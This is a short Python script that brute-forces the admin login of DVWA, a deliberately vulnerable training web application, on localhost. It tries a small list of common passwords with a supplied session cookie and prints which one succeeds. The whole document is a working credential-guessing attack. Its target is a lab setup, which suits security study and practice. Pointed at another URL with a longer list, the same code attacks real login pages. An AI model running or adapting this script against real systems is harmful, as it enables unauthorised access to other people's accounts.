import requests as r
from colorama import Fore, Style, init
def main(Target, CookieId):
    Headers = {
        "Cookie" : CookieId,
        "User-Agent" : "Mozilla/5.0 (Intruder)"
    }

    passwords = ["12345", "password", "abcdef","a110"]
    init(autoreset=True)
    for pwd in passwords:
        params = {
            "username":"admin",
            "password": pwd,
            "Login" : "Login"
        }

        response = r.get(url=Target, headers=Headers, params=params)

        if "Welcome to the password protected area" in response.text:
            print(Fore.GREEN + f"Password is {pwd}")
            break
        else:
            print(Fore.RED + f"Password is Not {pwd}")

CookieId =  "PHPSESSID=Your Cookie; security=low"
Url = "http://localhost/DVWA-master/vulnerabilities/brute/"

main(Url, CookieId)